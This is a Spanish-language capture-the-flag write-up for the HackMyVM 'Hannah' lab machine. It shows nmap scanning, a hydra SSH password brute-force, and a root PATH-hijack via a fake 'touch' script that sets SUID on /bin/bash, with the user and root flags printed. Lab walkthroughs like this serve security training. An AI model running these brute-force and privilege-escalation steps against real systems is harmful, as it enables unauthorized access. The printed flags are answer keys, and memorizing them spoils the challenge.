---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Hannah HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 03:55 EDT
Nmap scan report for 192.168.5.37
Host is up (0.00095s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
|_auth-owners: root
80/tcp  open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/enlightenment
|_auth-owners: moksha
|_http-server-header: nginx/1.18.0
113/tcp open  ident?
|_auth-owners: root
MAC Address: 08:00:27:D9:95:A5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.71 seconds
```

## Escalate user moksha

Veremos que hay `2` puertos interesantes el `80` y el `113`, ya de primeras en el escaneo de `nmap` vemos un usuario potencial que se llama `moksha` que esta en esta linea:

```
|_auth-owners: moksha
```

Tambien estamos viendo un posible directorio indexado por el `robots.txt` que esta en esta otra liena:

```
|_/enlightenment
```

Si nos metemos como directorio web no veremos que nos cargue, nos pone un `404` por lo que no existe, vamos a probar a tirar un ataque de fuerza bruta con el usuario `moksha` a ver si hay suerte.

### Hydra

```shell
hydra -l moksha -P <WORDLIST> ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-11 04:01:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.5.37:22/
[22][ssh] host: 192.168.5.37   login: moksha   password: hannah
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 17 final worker threads did not complete until end.
[ERROR] 17 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-11 04:01:29
```

Veremos que hemos obtenido las credenciales del usuario `moksha` por lo que vamos a conectarnos por `SSH`.

### SSH

```shell
ssh moksha@<IP>
```

Metemos como contraseña `hannah` y veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMVGGHFWP2023
```

## Escalate Privileges

Si leemos las tareas programadas del sistema veremos lo siguiente:

```shell
cat /etc/crontab
```

Info:

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * * * * root touch /tmp/enlIghtenment
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

Vemos unas lineas bastante interesantes que son las siguientes:

```

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

* * * * * root touch /tmp/enlIghtenment
```

Vamos a intentar buscar alguna carpeta en la que podamos escribir de forma libre dentro de ese `PATH`, encontramos la carpeta llamada `/media` la cual tenemos todos los permisos para crear cualquier archivo, vamos a realizar un `Path Hijacking` ya que se esta utilizando antes que la del `/bin` lo haremos de la siguiente forma:

```shell
cd /media
touch touch
nano touch

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos y le establecemos permisos de ejecucion.

```shell
chmod +x touch
```

Ahora solo tendremos que esperar un rato y si listamos la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
```

Vemos que ha funcionado, por lo que escalaremos a `root`.

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
HMVHAPPYNY2023
```
